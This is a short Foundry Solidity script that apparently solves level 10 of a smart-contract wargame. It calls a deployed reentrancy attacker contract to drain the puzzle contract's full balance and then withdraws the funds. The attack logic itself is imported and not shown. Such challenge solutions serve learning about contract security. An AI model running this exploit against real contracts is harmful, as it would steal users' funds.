// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {ReentrancyAttacker} from "../../src/attackers/10/ReentrancyAttacker.sol";

contract ReentrancySolution is Script {
    //need to manually enter the attacker address, since it is a legacy version contract, Devops cannot be compiled
    function run(address attacker) public {
        ReentrancyAttacker attackerContract = ReentrancyAttacker(payable(attacker));
        address target = address(attackerContract.puzzleContract());
        uint256 balance = target.balance;

        vm.startBroadcast();
        attackerContract.attack{value: balance}();
        attackerContract.withdraw();
        vm.stopBroadcast();
    }
}